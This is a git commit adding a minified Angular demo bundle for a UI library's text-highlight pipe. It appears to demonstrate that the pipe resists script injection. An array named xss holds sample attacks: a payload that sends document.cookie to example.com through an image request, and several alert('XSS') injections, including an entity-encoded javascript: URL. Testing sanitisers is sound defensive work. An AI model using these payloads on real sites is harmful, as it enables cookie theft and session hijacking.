d306c2c36b07614fe3506d104baec5a2dad6528a
swi-global-circleci <circleci@circleci>
2024-11-17 11:33:02 +0000

    add docs

---
+++ projects/bits/release_v16.0.x/examples/210.51e2d940e241122e.js
@@ -0,0 +1,29 @@
+"use strict";(self.webpackChunkdemo=self.webpackChunkdemo||[]).push([[210],{50210:(M,h,n)=>{n.r(h),n.d(h,{default:()=>E});var l=n(61259),c=n(49432),a=n(61796),e=n(99019),g=n(62770),u=n(54739),m=n(49232),p=n(3586);function d(t,s){if(1&t&&(e.nrm(0,"p",4),e.nI1(1,"nuiHighlight")),2&t){const r=s.$implicit;e.Y8G("innerHTML",e.i5U(1,1,r,r),e.npT)}}function f(t,s){if(1&t&&(e.nrm(0,"p",4),e.nI1(1,"nuiHighlight")),2&t){const r=s.$implicit,i=e.XpG();e.Y8G("innerHTML",e.i5U(1,1,r,i.search),e.npT)}}let T=(()=>{class t{constructor(){this.contentString=$localize`
+        Hello, it's me, I was wondering,<br>
+        If after all these years you'd like to meet to go over everything,<br>
+        They say that time's supposed to heal, yeah,<br>
+        But I ain't done much healing,<br>
+        <br>
+        Hello, can you hear me?,<br>
+        I'm in California dreaming about who we used to be,<br>
+        When we were younger and free,<br>
+        I've forgotten how it felt before the world fell at our feet,<br>
+        <br>
+        There's such a difference between us,<br>
+        And a million miles,<br>
+        <br>
+        Hello from the other side,<br>
+        I must've called a thousand times ,<br>
+        To tell you I'm sorry, for everything that I've done,<br>
+        But when I call you never seem to be home,<br>
+        <br>
+        Hello from the outside,<br>
+        At least I can say that I've tried ,<br>
+        To tell you I'm sorry, for breaking your heart,<br>
+        But it don't matter, it clearly doesn't tear you apart anymore
+    `,this.contentStringIgnore=$localize`
+        Hello, can you hear me?,<br>
+        I'm in California dreaming about who we used to be,<br>
+        When we were younger and free,<br>
+        I've forgotten how it felt before the world fell at our feet,
+    `,this.xss=["http://localhost:4200/#/highlight",'><SCRIPT>var+img=new+Image();img.src="http://example.com/"%20+%20document.cookie;<\/SCRIPT>',"<div>inlinescript<SCRIPT>alert('XSS')<\/SCRIPT></div>","<IMG SRC=\"javascript:alert('XSS');\">","<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",'<a onclick="alert(\'XSS\')" class="someclass">xss anchor</a>'],this.search="c"}static{this.\u0275fac=function(i){return new(i||t)}}static{this.\u0275cmp=e.VBU({type:t,selectors:[["nui-highlight"]],decls:25,vars:12,consts:function(){let r,i;return r=$localize`:␟220f75007b39241cb07366aa68b51ffb7d2731f6␟3166421379558502876:Search Term:`,i=$localize`:␟72eac312f0e0f1c263963c6fe556f4ec279d39ca␟8943076329770786823: Text below is piped via filter as well. But highlight doesn't appear. ${"\ufffd#21\ufffd\ufffd/#21\ufffd"}:LINE_BREAK: Class ${"\ufffd#22\ufffd"}:START_ITALIC_TEXT:nui-ignore-highlight${"\ufffd/#22\ufffd"}:CLOSE_ITALIC_TEXT: on container prevents it. `,[[3,"innerHTML",4,"ngFor","ngForOf"],["for","search"],r,["id","search",3,"ngModel","ngModelChange"],[3,"innerHTML"],[1,"nui-ignore-highlight"],[1,"nui-text-label"],i]},template:function(i,o){1&i&&(e.j41(0,"nui-example-wrapper")(1,"h3"),e.EFF(2,"XSS + self highlight"),e.k0s(),e.DNE(3,d,2,4,"p",0),e.nrm(4,"nui-divider"),e.j41(5,"h3"),e.EFF(6,"XSS + search"),e.k0s(),e.j41(7,"label",1),e.pXf(8,2),e.k0s(),e.nrm(9,"br"),e.j41(10,"input",3),e.bIt("ngModelChange",function(H){return o.search=H}),e.k0s(),e.nrm(11,"br")(12,"nui-divider"),e.EFF(13),e.DNE(14,f,2,4,"p",0),e.nrm(15,"nui-divider")(16,"p",4),e.nI1(17,"nuiHighlight"),e.j41(18,"section",5)(19,"p",6),e.PLo(20,7),e.nrm(21,"br")(22,"i"),e.YFu(),e.k0s(),e.nrm(23,"p",4),e.nI1(24,"nuiHighlight"),e.k0s()()),2&i&&(e.R7$(3),e.Y8G("ngForOf",o.xss),e.R7$(7),e.Y8G("ngModel",o.search),e.R7$(3),e.SpI(" search = ",o.search," "),e.R7$(1),e.Y8G("ngForOf",o.xss),e.R7$(2),e.Y8G("innerHTML",e.i5U(17,6,o.contentString,o.search),e.npT),e.R7$(7),e.Y8G("innerHTML",e.i5U(24,9,o.contentStringIgnore,o.search),e.npT))},dependencies:[g.h,l.me,l.BC,l.vS,u.Sq,m.t,p.v],encapsulation:2})}}return t})();var I=n(69196);const F=[{path:"",component:T}];let E=(()=>{class t{static{this.\u0275fac=function(i){return new(i||t)}}static{this.\u0275mod=e.$C({type:t})}static{this.\u0275inj=e.G2t({providers:[{provide:a.uzs,useValue:(0,I.R)("highlight")}],imports:[a._eo,l.YN,l.X1,a.a4p,c.iI.forChild(F),a.WrP,c.iI]})}}return t})()}}]);
